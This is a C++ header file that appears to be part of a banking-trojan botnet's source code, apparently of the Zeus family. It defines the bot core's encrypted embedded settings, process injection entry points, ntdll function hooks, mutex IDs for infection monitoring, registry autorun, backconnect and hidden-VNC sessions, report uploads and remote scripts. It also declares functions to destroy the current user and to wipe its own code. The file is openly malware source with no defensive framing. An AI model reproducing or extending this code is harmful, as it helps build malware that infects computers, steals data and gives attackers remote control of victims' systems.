/*
  client's kernel basic initialization.

  Note: coreData.modules.kernel32:
  In principle, if injects code into other processes kernel32.dll library can not be loaded, 
  and inject is broken. However, the current results of the test for user processes kernel32.dll 
  loaded with ntdll.dll, and you shouldn't worry about the problem.
*/
#pragma once

#include "malwaretools.h"
#include "ntdll.h"
#include "wininet.h"
#include "generateddata.h"

//The size of the buffer in characters for the registry value.
#define CORE_REGISTRY_VALUE_BUFFER_SIZE 10       

//The size of the buffer in characters for the registry key.
#define CORE_REGISTRY_KEY_BUFFER_SIZE (sizeof(PATH_REGKEY) + CORE_REGISTRY_VALUE_BUFFER_SIZE + 1)

//The settings are stored in the PE file.
#pragma pack(push, 1)
typedef struct
{
  //Binding.
  DWORD size;           //Full size settings.
  WCHAR compId[60];     //CompID.
  GUID guid;            //Binary GUID association with OS.
  Crypt::RC4KEY rc4Key; //The encryption key for the OS.

  //Path information.
  struct
  {
    char coreFile[20];                                      //Relative path of loader. (6(dir) + 1(\) + 5(name) + 4(.exe) + 1(\0))
    char reportFile[20];                                    //Relative path for reports. (6(dir) + 1(\) + 5(name) + 4(.ext) + 1(\0))
    char regKey[CORE_REGISTRY_VALUE_BUFFER_SIZE];           //The relative path in the registry. (6(dir))
    char regDynamicConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //The registry value to store configuration.
    char regLocalConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE];   //The registry value to store the local configuration.
    char regLocalSettings[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //The registry value to store settings.
  }userPaths;

  DWORD processInfecionId; //ID to generate the mutex infected processes.
  DWORD storageArrayKey;   //XOR key for storing reports.
}PESETTINGS;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct
{
	PESETTINGS peSettings;									//PE settings stored
#if BO_PACKED==1
  MISSING_PE_DATA_INFO relocationInfo;		//to use UPX we need to store original relocation table (.reloc)
#endif
}LOADERDATA;
#pragma pack(pop)

//The structure contains the basic data of the current process.
typedef struct
{
  //////////////////////////////////////////////////////////////////////////////////////////////////
  // 'on_all'   - updated with any startup.
  // 'on_copy'  - updated into the copy module. And also on_start.
  // 'on_start' - change only when normal startup, or saved from the module to module.
  //////////////////////////////////////////////////////////////////////////////////////////////////

  /*on_copy*/DWORD proccessFlags; //Personal process details.

  //Current user data.
  struct
  {
    /*on_all*/TOKEN_USER *token; //current user token.
    /*on_all*/DWORD sidLength;   //Length of SID in pTokenUser.
    /*on_all*/DWORD id;          //CRC32 for the SID in pTokenUser.
    /*on_all*/DWORD sessionId;   //session ID.
  }currentUser;

  struct
  {
    /*on_copy*/HMODULE current;
    /*on_all*/ HMODULE kernel32;
    /*on_all*/ HMODULE ntdll;
  }modules;

  //Functions for import from ntdll.dll.
# pragma pack(push, 1)
  struct
  {
    /*on_all*/ntdllNtCreateThread            ntCreateThread;      //Check for NULL, before accessing.
    /*on_all*/ntdllNtCreateUserProcess       ntCreateUserProcess; //Check for NULL, before accessing.
    /*on_all*/ntdllNtQueryInformationProcess ntQueryInformationProcess;
    /*on_all*/void *                         rtlUserThreadStart;
#   if(0)
    /*on_all*/ntdllNtQueryDirectoryFile      ntQueryDirectoryFile;
#   endif
#   if defined HOOKER_LDRLOADDLL
    /*on_all*/ntdllLdrLoadDll                ldrLoadDll;
    /*on_all*/ntdllLdrGetDllHandle           ldrGetDllHandle;
#   endif
#   if defined HOOKER_NTCREATEFILE
    /*on_all*/ntdllNtCreateFile              ntCreateFile;
#   endif
    /*on_all*/ntdllNtTerminateProcess        ntTerminateProcess;
  }ntdllApi;
# pragma pack(pop)

  //security attributes.
  struct
  {
    /*on_all*/SECURITY_ATTRIBUTES saAllowAll;
    /*on_all*/SECURITY_DESCRIPTOR sdAllowAll;
    /*on_all*/void *buf;
  }securityAttributes;

  //Paths.
  struct
  {
    /*on_all*/LPWSTR process;         //The full path of the current file.
    /*on_start*/WCHAR home[MAX_PATH]; //The home directory.
  }paths;

  /*on_all*/DWORD winVersion;           //Windows version.
  /*on_all*/BOOL is64bitOS;             //Is OS 64bit.
  /*on_all*/BYTE integrityLevel;        //The application level.
  /*on_all*/DWORD pid;                  //process ID.
  /*on_all*/LPSTR httpUserAgent;        //HTTP user-agent, prior to accessing the variable,
										//call Core::initHttpUserAgent();
  /*on_start*/GUID osGuid;              //OS guid.
  /*on_start*/PESETTINGS peSettings;    //These data are stored encryption, you can get them through
                                        //Core::getPeSettings(). WARNING! Core::init() not called 
										//by itself.
  /*on_start*/WCHAR installId[40];      //installer ID to install as an upgrade.
  
  //Basic configuration.
  struct
  {
    /*on_start*/DWORD xorKey;   //XOR key (size greater than or equal size).
  }baseConfigInfo;

  //global objects.
  struct
  {
    /*on_copy*/HANDLE stopEvent;        //Signal to stop global threads of bot.
    /*on_copy*/HANDLE stopedEvent;      //Signal to stop global threads of the bot. While true 
										//only for wow64.
  }globalHandles;
#if BO_PACKED==1
  /*on_start*/MISSING_PE_DATA_INFO relocationInfo; //to use UPX we need to store original relocation table (.reloc)
#endif
}COREDATA;
extern COREDATA coreData;

namespace Core
{
  //object ID.
  enum
  {
    OBJECT_ID_LOADER                = 0x905CD656, //The loader code in all processes (mutex).
    OBJECT_ID_LOADER_READY          = 0x9CA9C49A, //The loader code is loaded (Event).
    OBJECT_ID_INSTALLER             = 0xA47CA06C, //The installer bot login (mutex).
    OBJECT_ID_CONTROL_INFECTION     = 0xA887A774, //The thread monitoring bot (infection thread mutex).
    OBJECT_ID_CONTROL_AUTORUN       = 0xAC507E30, //The thread monitoring bot (auto, mutex).
    OBJECT_ID_TCP_SERVER            = 0xB35580CC, //Thread of TCP server (mutex).
    OBJECT_ID_BACKCONNECT_CONTROL   = 0xB7362070, //Backconnect thread control (mutex).
    OBJECT_ID_SERVER_SESSION_REPORT = 0xBBDC1671, //The thread to the send report sessions (mutex).
    OBJECT_ID_SERVER_SESSION_STATUS = 0xC17BCF30, //The thread to the send status sessions (mutex).
    OBJECT_ID_DYNAMIC_CONFIG        = 0xC4C1DD4C, //The thread to update the dynamic configuration (mutex).
    OBJECT_ID_BOT_STATUS            = 0xC85E5CF0, //Status of a bot in the current system (ID).
    OBJECT_ID_BOT_STATUS_SECRET     = 0xCB28B84A, //Status of a bot in the current system (ID).
    OBJECT_ID_REG_AUTORUN           = 0xD0A58F32, //Autorun object (registry).
    OBJECT_ID_REPORTFILE            = 0xD58F401A, //Access to the log file (mutex).
    OBJECT_ID_LOCALCONFIG           = 0xDB37672C, //Access to the local configuration in the registry (mutex).
    OBJECT_ID_LOCALSETTINGS         = 0xDED0F678, //Access to local settings in the registry (mutex).
    OBJECT_ID_REMOTESCRIPT          = 0xE297E3C0, //execution of the script (mutex).
    OBJECT_ID_VNC_MESSAGE           = 0xE6A4A318, //Window message for VNC.
    OBJECT_ID_VNC_EVENT             = 0xEA6683AE, //The event message window for VNC (Event).
    OBJECT_ID_VNC_PAINT_MUTEX       = 0xEE225176, //mutex painting windows for VNC (mutex).
    OBJECT_ID_VNC_DESKTOP           = 0xF1D40292, //Desktop for VNC.
    OBJECT_ID_VNC_MAPFILE           = 0xF58F841A, //Map file for VNC (object).
    OBJECT_ID_VNC_GLOBALDATA_MUTEX  = 0xFA2B43EC, //mutex access to global VNC objects (mutex).
  };
  
  //flags of coreData.processFlags.
  enum
  {
    /*
      The process under WOW64, the flag may be present only at initialization INITF_NORMAL_START. 
    */
#   if !defined _WIN64
    CDPF_WOW64                            = 0x001,
#   endif
    
    /*
	The flag is relevant only for use in the primary bot process. Specifies not to call
	ExitProcess() in the main thread bot instead call Sleep(INIFINITE).
    */
    CDPF_NO_EXITPROCESS                   = 0x002,
    
    /*
      The process under the VNC-server.
    */
#   if(BO_VNC > 0)    
    CDPF_VNC_ACTIVE                       = 0x004,
#   endif    

    /*
      Prohibit the creation of processes.
    */
    CDPF_DISABLE_CREATEPROCESS            = 0x010,
    
    /*
      Process rights of TCP server functions.
    */
    CDPF_RIGHT_TCP_SERVER                 = 0x020,

    /*
      Rights of the process of making connections to the server.
    */
    CDPF_RIGHT_SERVER_SESSION             = 0x040,

    /*
      Rights of the process that monitors the integrity of the process bot.
    */
    CDPF_RIGHT_CONTROL                    = 0x080,

    /*
      Process rights of backconnect.
    */
    CDPF_RIGHT_BACKCONNECT_SESSION        = 0x100,
    
    /*
      All rights.
    */
    CDPF_RIGHT_ALL                        = CDPF_RIGHT_TCP_SERVER |
                                            CDPF_RIGHT_SERVER_SESSION |
                                            CDPF_RIGHT_CONTROL |
                                            CDPF_RIGHT_BACKCONNECT_SESSION,

  /*
    The mask, The mask, which must be inherited from process to process.
  */
  CDPT_INHERITABLE_MASK                   = CDPF_DISABLE_CREATEPROCESS   
#                                           if(BO_VNC > 0)    
                                            | CDPF_VNC_ACTIVE
#                                           endif    
  };

  //flags for init().
  enum
  {
    INITF_NORMAL_START        = 0x0, //Code execution as a process.
    INITF_INJECT_START        = 0x1, //Code execution as inject.
    INITF_HOOKS_FOR_USER      = 0x2, //Set custom hooks.
  };
  
  //types of getPeSettingsPath().
  enum
  {
    PSP_QUICKSETTINGSFILE, //Currently, just a file browser home page.
    PSP_COREFILE,          //PESETTINGS::userPaths.core.
    PSP_REPORTFILE,        //PESETTINGS::userPaths.other.
    PSP_REGKEY             //PESETTINGS::userPaths.regKey.
  };

  //types of getBinaryDataFromRegistry().
  enum
  {
    RV_DYNAMICCONFIG, //PESETTINGS::userPaths.regDynamicConfig.
    RV_LOCALCONFIG,   //PESETTINGS::userPaths.regLocalConfig.
    RV_LOCALSETTINGS  //PESETTINGS::userPaths.regLocalSettings.
  };

  //Types of messages for showInfoBox().
  enum
  {
    SIB_BOT_INFO,         //Basic information about bot.
    SIB_CRYPT_PROTECTION, //The wrong message about the crypt.
  };

  /*
    Init.

    IN flags - flags INITF_*. and flags INITF_HOOKS_FOR_*, may not be used simultaneously.

    Return   - true - in case of success,
               false - in case of error.

    Note: uninit() must be called regardless of the value of this function returns.
  */
  bool init(DWORD flags);

  /*
    Uninit.
  */
  void uninit(void);

  /*
    Initialization coreData.httpUserAgent. You must call this function before accessing the
	coreData.httpUserAgent.
  */
  void initHttpUserAgent(void);

  /*
    Setting the default values ​​for Wininet::CALLURLDATA.

    OUT cud - structure for processing.
  */
  void initDefaultCallUrlData(Wininet::CALLURLDATA *cud);

  /*
    Create a unique process mutex.

    IN pid - process ID.

    Return - mutex handle in case of success,
             NULL - if the mutex already exists, or if an error.
  */
  HANDLE createMutexOfProcess(DWORD pid);

  /*
    Generation named kernel object.

    IN id              - OBJECT_ID_*.
    OUT buffer         - name (the buffer is less than 50 characters).
    IN objectNamespace - MalwareTools::KON_*.
  */
  void generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace);

  /*
    Waiting for the mutex release and its capture.

    IN id              - OBJECT_ID_*.
    IN objectNamespace - MalwareTools::KON_*.

    Return             - mutex handle.

    Note: To release the mutex must call Sync::_freeMutex().
  */
  HANDLE waitForMutexOfObject(DWORD id, BYTE objectNamespace);
  
  /*
    Initialize a new instance of the module.

    IN process       - process.
    IN processMutex  - mutex of newly created process.
    IN proccessFlags - data for the new coreData.proccessFlags, the 
					   current data are inherited by the mask CDPT_INHERITABLE_MASK.

    Return           - module address in the process in case of success,
                       NULL - in case of error.
  */
  void *initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags);

  /*
    Disable the display of various error messages of the current process.
    
    Return - previous error flags SEM_*.
  */
  DWORD disableErrorMessages(void);

  /*
    The substitution of the hooked function to the original, if this is imported through coreData.

    IN oldFunction - address of current function.
    IN newFunction - address of new function.
  */
  void replaceFunction(const void *oldFunction, const void *newFunction);

  /*
    Function to check that the current kernel is active and should provide a functionality.
    (for example if the bot will be updated with a newer version, the kernel will not be active).

    Return - true - active,
             false - not active.
  */
  bool isActive(void);
  
  /*
    Destruction of functions by inserting random characters.

    IN p - function.
  */
  void _destroyFunction(void *p);

  /*
    Generation of computer identifier.

    OUT buf - buffer for identifier, at least 60 characters.
  */
  void _generateBotId(LPWSTR buf);

  /*
    Obtaining basic configuration.
    
    OUT bc - BASECONFIG.
  */
  void getBaseConfig(BASECONFIG *bc);

  /*
    Obtaining PESETTINGS.
    
    OUT ps - PESETTINGS.
  */
  void getPeSettings(PESETTINGS *ps);

  /*
    Retrieves the full path to the path recorded in PESETTINGS.

    IN type  - type PSP_*.
    OUT path - path.
  */
  void getPeSettingsPath(DWORD type, LPWSTR path);
  
  /*
    Load data from register BDR_*.

    IN type   - the type of value RV_*.
    OUT key   - registry key. Buffer size CORE_REGISTRY_KEY_BUFFER_SIZE.
    OUT value - registry value. Buffer size CORE_REGISTRY_VALUE_BUFFER_SIZE.
  */
  void getRegistryValue(DWORD type, LPWSTR key, LPWSTR value);
  
  /*
    Getting the name of the current botnet.

    OUT name - buffer.
  */
  void getCurrentBotnetName(LPWSTR name);
  
  /*
    Getting data from the overlay.
    
    IN image           - image.
    IN OUT overlaySize - on input - memory size, on output data size of the overlay.

    Return             - overlay, must be freed by Mem. Or NULL - in case of error.
  */
  void *getBaseOverlay(const void *mem, LPDWORD size);
  
  /*
    Storing data in the overlay.

    IN image    - image.
    IN size     - memory size.
    IN data     - overlay.
    IN dataSize - overlay size.

    Return      - true - in case of success,
                  false - in case of error.
  */
  bool setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize);

  /*
    Waiting for start of kernel services in the current process.

    IN waitStop - true - wait for the completion of all service threads,
                  false - exit the function immediately after creating services.
  */
  void createServices(bool waitStop);

  /*
    The destruction of the current user.
  */
  bool destroyUser(void);

  /*
    Displays information about the built bot.

    IN type - SIB_*.
    
    Return  - true - in case of success,
              false - in case of error.
  */
  bool showInfoBox(BYTE type);

  /*
    The entry point as injector of the module.

    Return - return code.
  */
  int WINAPI _injectEntryForModuleEntry(void);

  /*
    The entry point inject as a point thread entry.

    Return - return code.
  */
  DWORD WINAPI _injectEntryForThreadEntry(void *);

  /*
    The main entry point.
  */
  void WINAPI _entryPoint(void);
};
